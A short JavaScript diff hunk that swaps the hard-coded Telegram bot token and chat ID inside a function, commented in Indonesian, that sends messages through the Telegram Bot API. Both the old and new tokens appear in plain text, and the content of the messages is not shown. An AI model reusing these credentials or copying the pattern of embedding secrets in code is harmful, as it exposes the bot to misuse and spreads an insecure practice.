@@ -92,8 +92,8 @@ document
 
 // Fungsi untuk mengirim ke Telegram
 function sendToTelegram(message) {
-  const botToken = "7410437482:AAHjVoPurOsB4-yoSFVinzj8VNnrAPVjmpc";
-  const chatId = "5265564576";
+  const botToken = "7592836689:AAF_-I0iLIBvALIvfyHIn1ShwcQGoQ1lAhk";
+  const chatId = "6635454493";
 
   return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: "POST",
